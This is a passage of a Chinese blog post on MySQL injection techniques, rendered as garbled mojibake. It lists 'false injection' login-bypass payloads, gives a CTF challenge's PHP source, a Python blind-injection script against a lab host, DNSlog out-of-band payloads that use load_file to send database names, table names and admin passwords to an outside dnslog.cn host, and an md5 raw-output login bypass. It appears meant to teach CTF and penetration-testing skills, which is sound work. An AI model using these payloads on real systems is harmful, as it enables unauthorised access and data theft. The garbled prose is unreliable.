<p>MYSQL çš„éšå¼ç±»å‹è½¬æ¢ï¼Œå³å½“å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šæŠŠå­—ç¬¦ä¸²è½¬ä¸ºæµ®ç‚¹æ•°ï¼Œè€Œå­—ç¬¦ä¸²è½¬æ¢ä¸ºæµ®ç‚¹æ•°å¾ˆæ˜æ˜¾ä¼šè½¬æ¢å¤±è´¥ï¼Œè¿™æ—¶å°±ä¼šäº§ç”Ÿä¸€ä¸ªwarningï¼Œè½¬æ¢çš„ç»“æœä¸º0ï¼Œç„¶å<code>0 = 0</code> è¿”å›çš„æ˜¯ <code>True</code> ï¼Œè¿™æ ·å°±å°†è¡¨ä¸­çš„æ•°æ®å…¨éƒ¨è¿”å›äº†ã€‚ä½†å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æ˜¯æ•°å­—è¯è¿˜æ˜¯ä¼šä»æ•°å­—éƒ¨åˆ†æˆªæ–­ï¼Œè½¬æ¢ä¸ºæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œåœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­ï¼Œpasswd å­—æ®µä¸­æœ‰ä¸€ä¸ªå€¼æ˜¯ä»¥æ•°å­—1å¼€å¤´çš„å¹¶éä¸º0ï¼Œå†è¿›è¡Œ <code>passwd = 0</code> æ¯”è¾ƒæ—¶ï¼Œä¼šä»1å¼€å§‹æˆªæ–­ï¼Œ<code>1 = 0</code> ä¸æˆç«‹ï¼Œå½“ç„¶å°±åªè¿”å›ä¸¤æ¡æ•°æ®äº†ã€‚è¿™å°±æ˜¯ MYSQL False æ³¨å…¥çš„åŸç†ã€‚</p>
<h5 id="False-æ³¨å…¥åˆ©ç”¨"><a href="#False-æ³¨å…¥åˆ©ç”¨" class="headerlink" title="False æ³¨å…¥åˆ©ç”¨"></a>False æ³¨å…¥åˆ©ç”¨</h5><p>ä¸‹é¢æˆ‘ä»¬è®²è®² False æ³¨å…¥å¦‚ä½•åˆ©ç”¨ï¼ŒåŠå¦‚ä½•æ„é€  False æ³¨å…¥çš„åˆ©ç”¨ç‚¹ã€‚åœ¨å®é™…ä¸­æˆ‘ä»¬æ¥è§¦åˆ°çš„è¯­å¥éƒ½æ˜¯å¸¦æœ‰å¼•å·çš„ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username =&#x27;.$username.&#x27;;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¦‚ä½•ç»•è¿‡å¼•å·æ„é€ å‡º 0 è¿™ä¸ªå€¼å‘¢ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›å¤„ç†æ¥æ„é€ falseæ³¨å…¥çš„<strong>åˆ©ç”¨ç‚¹</strong>ï¼Ÿ</p>
<p>å¯ä»¥ä½¿ç”¨çš„å§¿åŠ¿æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä¸‹é¢çš„ç®—æ•°è¿ç®—ï¼š</p>
<ul>
<li>åˆ©ç”¨ç®—æ•°è¿ç®—</li>
</ul>
<p>åŠ ï¼š+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;+&#x27;, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;+&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>å‡ï¼š-</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;-&#x27;, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>ä¹˜ï¼š*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;*&#x27;, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;*&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>é™¤ï¼š&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;/6#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;/6#&#x27;;</span><br></pre></td></tr></table></figure>

<p>å–ä½™ï¼š%</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;%1#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;%1#&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨ä½æ“ä½œè¿ç®—</li>
</ul>
<p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿ç®—çš„æ—¶å€™ç±»å‹è½¬æ¢çš„é—®é¢˜è¿›è¡Œåˆ©ç”¨ã€‚</p>
<p>å’Œè¿ç®—ï¼š&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;&amp;0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;&amp;0#&#x27;;</span><br></pre></td></tr></table></figure>

<p>æˆ–è¿ç®—ï¼š|</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;|0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;|0#&#x27;;</span><br></pre></td></tr></table></figure>

<p>å¼‚æˆ–è¿ç®—ï¼š^</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;^0#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;&#x27;^0#&#x27;;</span><br></pre></td></tr></table></figure>

<p>ç§»ä½æ“ä½œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥&#x27;&lt;&lt;0# æˆ– &#x27;&gt;&gt;0#, æ‹¼æ¥çš„è¯­å¥: </span><br><span class="line">select * from user where username =&#x27;&#x27;&lt;&lt;0#&#x27;;</span><br><span class="line">select * from user where username =&#x27;&#x27;&gt;&gt;0#&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨æ¯”è¾ƒè¿ç®—ç¬¦</li>
</ul>
<p>å®‰å…¨ç­‰äºï¼š&lt;&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=0&lt;=&gt;1# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=&#x27;&#x27;=0&lt;=&gt;1#&#x27;</span><br></pre></td></tr></table></figure>

<p>ä¸ç­‰äº&lt;&gt;(!&#x3D;)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=0&lt;&gt;0# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=&#x27;&#x27;=0&lt;&gt;0#&#x27;</span><br></pre></td></tr></table></figure>

<p>å¤§å°äº&gt;æˆ–&lt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;-1# æ‹¼æ¥çš„è¯­å¥ï¼šwhere username=&#x27;&#x27;&gt;-1#</span><br></pre></td></tr></table></figure>

<ul>
<li>å…¶ä»–</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+1 is not null#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span><br></pre></td></tr></table></figure>

<h5 id="ç»¼åˆåˆ©ç”¨"><a href="#ç»¼åˆåˆ©ç”¨" class="headerlink" title="ç»¼åˆåˆ©ç”¨"></a>ç»¼åˆåˆ©ç”¨</h5><p>falseæ³¨å…¥è¿™ç§æ³¨å…¥æ–¹å¼æœ‰çš„ä¼˜åŠ¿å°±æ˜¯ï¼Œ<strong>åœ¨æŸäº›ç‰¹å®šæ—¶å€™å¯ä»¥ç»•è¿‡WAFæˆ–è€…æ˜¯ä¸€äº›å…¶ä»–çš„ç»•è¿‡</strong>ã€‚</p>
<p>è¿™é‡Œä¸¾ä¾‹ä¸€é“é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include(&quot;config.php&quot;);  </span><br><span class="line">$conn -&gt;query(&quot;set names utf8&quot;);  </span><br><span class="line"></span><br><span class="line">function randStr($lenth=32)&#123;</span><br><span class="line">     $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;</span><br><span class="line">     $str = &quot;&quot;;</span><br><span class="line">     while($lenth&gt;0)&#123;</span><br><span class="line">       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);</span><br><span class="line">       $lenth --;</span><br><span class="line">     &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line">if($install)&#123;</span><br><span class="line">     $sql = &quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;</span><br><span class="line">     if($conn-&gt;query($sql))&#123;</span><br><span class="line">        $sql  = &quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;.md5(randStr()).&quot;&#x27;,&#x27;admin&#x27;)&quot;;</span><br><span class="line">        $conn -&gt; query($sql);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function filter($str)&#123;</span><br><span class="line">      $filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br><span class="line">      if(preg_match($filter,$str))&#123;</span><br><span class="line">          die(&quot;you can&#x27;t input this illegal char!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line">function show($username)&#123;</span><br><span class="line">   global $conn;</span><br><span class="line">   $sql = &quot;select role from `user` where username =&#x27;&quot;.$username.&quot;&#x27;&quot;;</span><br><span class="line">   $res = $conn -&gt;query($sql);</span><br><span class="line">   if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&#x27;role&#x27;];</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">        die(&quot;Don&#x27;t have this user!&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function login($username,$passwd)&#123;</span><br><span class="line">     global $conn;</span><br><span class="line">     global $flag;</span><br><span class="line">     $username = trim(strtolower($username));</span><br><span class="line">     $passwd = trim(strtolower($passwd));</span><br><span class="line">     if($username == &#x27;admin&#x27;)&#123;</span><br><span class="line">         die(&quot;you can&#x27;t login this as admin!&quot;);</span><br><span class="line">     &#125;  </span><br><span class="line">     $sql = &quot;select * from `user` where username=&#x27;&quot;.$conn-&gt;escape_string($username).&quot;&#x27; and passwd=&#x27;&quot;.$conn-&gt;escape_string($passwd).&quot;&#x27;&quot;;</span><br><span class="line">     $res = $conn -&gt;query($sql);</span><br><span class="line">     if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">           if($res-&gt;fetch_assoc()[&#x27;role&#x27;] === &#x27;admin&#x27;) exit($flag);</span><br><span class="line">     &#125;else&#123; </span><br><span class="line">           echo &quot;sorry,username or passwd error!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  function source()&#123;</span><br><span class="line">      highlight_file(__FILE__);</span><br><span class="line"> &#125;</span><br><span class="line">  $username = isset($_POST[&#x27;username&#x27;])?filter($_POST[&#x27;username&#x27;]):&quot;&quot;;</span><br><span class="line">  $passwd = isset($_POST[&#x27;passwd&#x27;])?filter($_POST[&#x27;passwd&#x27;]):&quot;&quot;;</span><br><span class="line">  $action = isset($_GET[&#x27;action&#x27;])?filter($_GET[&#x27;action&#x27;]):&quot;source&quot;;</span><br><span class="line"></span><br><span class="line">switch($action)&#123;</span><br><span class="line">    case &quot;source&quot;: source(); break ;</span><br><span class="line">    case &quot;login&quot; : login($username,$passwd);break;</span><br><span class="line">    case &quot;show&quot; : show($username);break; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ³¨æ„åˆ°<code>filter()</code>å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹èµ·æ¥è¿‡æ»¤çš„æ¯”è¾ƒå¤šï¼Œå…¶ä¸­andï¼Œorè¿˜æœ‰&amp;ï¼Œ|éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨<strong>falseè¿›è¡Œç›²æ³¨</strong>ã€‚</p>
<p>å¯ä»¥åœ¨showå‡½æ•°åˆ©ç”¨æŸ¥è¯¢çš„æ—¶å€™æ³¨å…¥ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå®˜æ–¹ç»™å‡ºçš„å°±æ˜¯åˆ©ç”¨å¼‚æˆ–ï¼Œå…¶å®è¿™é‡Œå¹¶ä¸éœ€è¦ admin åªè¦æ˜¯ä¸€ä¸²å­—ç¬¦ä¸²å°±å¯ä»¥</p>
<p>å¼‚æˆ–ä¼šä½¿å­—ç¬¦ä¸²éƒ½è½¬ä¸ºæµ®ç‚¹å‹ï¼Œéƒ½å˜ä¸ºäº†0ï¼Œç”±äº<code>0=0^0 -&gt; 1^0 -&gt; 1</code> å½“ç„¶å¯¹äºè¿™ä¸ªé¢˜å¹¶ä¸ä¸€å®šåˆ©ç”¨è¿™ä¸ªï¼Œç›´æ¥æˆªå–å­—ç¬¦ä¸²ä½œæ¯”è¾ƒå°±å¯ä»¥ï¼Œä½†æ˜¯è¿™é‡Œåªæ˜¯æä¾›ä¸€ç§å§¿åŠ¿ï¼Œç”±äºmysqlçš„çµæ´»ï¼Œå…¶èŠ±æ ·ä¹Ÿæ¯”è¾ƒå¤šè¿˜æœ‰å°±æ˜¯æ„é€ çš„payloadæ¯”è¾ƒç®€çŸ­ï¼Œä¾‹å¦‚â€™<code>+</code>â€˜ã€â€™<code>^</code>â€˜ã€â€™<code>/4#</code>â€˜ è¿™æ ·åªæœ‰ä¸‰ä¸ªå­—ç¬¦ä¾¿å¯ä»¥ç»•è¿‡ç™»å½•ï¼Œç®€å•ç²—æš´ï¼Œè¿˜æœ‰å°±æ˜¯ç±»ä¼¼çš„æ–‡ç« ä¸å¤šï¼Œè®¸å¤šå¼€å‘äººå‘˜å®¹æ˜“å¿½è§†è¿™äº›ç»†èŠ‚ã€‚</p>
<h5 id="ç›²æ³¨è„šæœ¬"><a href="#ç›²æ³¨è„šæœ¬" class="headerlink" title="ç›²æ³¨è„šæœ¬"></a>ç›²æ³¨è„šæœ¬</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for str in &quot;abcdefghijklmnopkrstuvwxyz&quot;:</span><br><span class="line">        url = &quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;.format(i,str+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        if &quot;You are in...........&quot; in res.text:</span><br><span class="line">            flag = str+flag</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h4 id="DNSæ³¨å…¥"><a href="#DNSæ³¨å…¥" class="headerlink" title="DNSæ³¨å…¥"></a>DNSæ³¨å…¥</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>é€šè¿‡å­æŸ¥è¯¢ï¼Œå°†å†…å®¹æ‹¼æ¥åˆ°åŸŸåå†…ï¼Œè®©load_file()å»è®¿é—®å…±äº«æ–‡ä»¶ï¼Œè®¿é—®çš„åŸŸåè¢«è®°å½•æ­¤æ—¶å˜ä¸ºæ˜¾é”™æ³¨å…¥,å°†ç›²æ³¨å˜æ˜¾é”™æ³¨å…¥,è¯»å–è¿œç¨‹å…±äº«æ–‡ä»¶ï¼Œé€šè¿‡æ‹¼æ¥å‡ºå‡½æ•°åšæŸ¥è¯¢,æ‹¼æ¥åˆ°åŸŸåä¸­ï¼Œè®¿é—®æ—¶å°†è®¿é—®æœåŠ¡å™¨ï¼Œè®°å½•åæŸ¥çœ‹æ—¥å¿—ã€‚</p>
<p>åœ¨æ— æ³•ç›´æ¥åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡DNSè¯·æ±‚,é€šè¿‡DNSlogï¼ŒæŠŠæ•°æ®å¤–å¸¦ï¼Œç”¨DNSè§£æè®°å½•æŸ¥çœ‹ã€‚</p>
<h5 id="LOAD-FILE-è¯»å–æ–‡ä»¶çš„å‡½æ•°"><a href="#LOAD-FILE-è¯»å–æ–‡ä»¶çš„å‡½æ•°" class="headerlink" title="LOAD_FILE() è¯»å–æ–‡ä»¶çš„å‡½æ•°"></a>LOAD_FILE() è¯»å–æ–‡ä»¶çš„å‡½æ•°</h5><blockquote>
<p>è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetï¼ˆé™åˆ¶serveræ¥å—çš„æ•°æ®åŒ…å¤§å°å‡½æ•°ï¼Œé»˜è®¤1MBï¼‰ã€‚ å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚</p>
</blockquote>
<p><strong>æ³¨ï¼šè¿™ä¸ªåŠŸèƒ½ä¸æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œéœ€è¦åœ¨mysqlé…ç½®æ–‡ä»¶åŠ ä¸€å¥ secure_file_priv&#x3D;</strong></p>
<h5 id="DNSLOGå¹³å°"><a href="#DNSLOGå¹³å°" class="headerlink" title="DNSLOGå¹³å°:"></a>DNSLOGå¹³å°:</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://dns.å’•.com/">https://dns.xn--9tr.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://log.å’•.com/">https://log.xn--9tr.com/</a></p>
</blockquote>
<h5 id="UNCè·¯å¾„"><a href="#UNCè·¯å¾„" class="headerlink" title="UNCè·¯å¾„"></a>UNCè·¯å¾„</h5><blockquote>
<p>UNCè·¯å¾„é€šç”¨å‘½åè§„åˆ™ï¼Œä¹Ÿç§°é€šç”¨å‘½åè§„èŒƒã€é€šç”¨å‘½åçº¦å®šï¼Œç±»ä¼¼\softerè¿™æ ·çš„å½¢å¼çš„ç½‘ç»œè·¯å¾„ã€‚</p>
</blockquote>
<p>UNCè·¯å¾„çš„ <strong>æ ¼å¼</strong> ï¼š<strong>\server\sharename\directory\filename</strong></p>
<p>ç­‰åŒäº<strong>SELECT LOAD_FILE(â€˜&#x2F;&#x2F;åº“å.1806dl.dnslog.cn&#x2F;abcâ€™</strong></p>
<p>å»è®¿é—® åº“å.1806dl.dnslog.cn çš„æœåŠ¡å™¨ä¸‹çš„å…±äº«æ–‡ä»¶å¤¹abcã€‚</p>
<p>ç„¶å1806dl.dnslog.cnçš„å­åŸŸåçš„è§£æéƒ½æ˜¯åœ¨æŸå°æœåŠ¡å™¨ï¼Œç„¶åä»–è®°å½•ä¸‹æ¥äº†æœ‰äººè¯·æ±‚è®¿é—®äº†error.1806dl.dnslog.cnï¼Œç„¶ååœ¨DnsLogè¿™ä¸ªå¹³å°ä¸Šé¢æ˜¾ç¤ºå‡ºæ¥äº†</p>
<p>payloadç¤ºä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, database(),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=â€™adminâ€™ and table_schema=database() limit 2,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select password from admin limit 0,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure>

<h4 id="â€˜â€œ-md5-pass-true-â€â€˜-ç™»å½•ç»•è¿‡"><a href="#â€˜â€œ-md5-pass-true-â€â€˜-ç™»å½•ç»•è¿‡" class="headerlink" title="â€˜â€œ.md5($pass,true).â€â€˜ ç™»å½•ç»•è¿‡"></a>â€˜â€œ.md5($pass,true).â€â€˜ ç™»å½•ç»•è¿‡</h4><p>å¾ˆå¤šç«™ç‚¹ä¸ºäº†å®‰å…¨éƒ½ä¼šåˆ©ç”¨è¿™æ ·çš„è¯­å¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;.md5($password,true).&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>md5(string,true)</code> å‡½æ•°åœ¨æŒ‡å®šäº†trueçš„æ—¶å€™ï¼Œæ˜¯è¿”å›çš„åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè¿”å›è¿™æ ·å­çš„å­—ç¬¦ä¸²ï¼š<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png" alt="img"></a></p>
<p>è¿™ä¸æ˜¯æ™®é€šçš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code> è¿™ç§ï¼Œè¿™æ ·çš„è¯å°±ä¼šå’Œå‰é¢çš„å½¢æˆé—­åˆï¼Œæ„æˆä¸‡èƒ½å¯†ç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;&#x27;or&#x27;6.......&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯æ°¸çœŸçš„äº†ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªä¸‡èƒ½å¯†ç äº†ç›¸å½“äº <code>1&#39; or 1=1#</code> æˆ– <code>1&#39; or 1#</code>ã€‚</p>
<blockquote>
<p>ä½†æ˜¯æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆ 6\xc9]\x99\xe9!r,\xf9\xedb\x1c çš„å¸ƒå°”å€¼æ˜¯trueå‘¢ï¼Ÿ</p>
<p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ï¼ˆè¿™ç±»ä¼¼äºPHPçš„å¼±ç±»å‹ï¼‰ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚ password&#x3D;â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword&#x3D;â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äº password&#x3D;â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚è¿™é‡Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚ password&#x3D;â€˜xxxâ€™ or 1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯ trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰</p>
</blockquote>
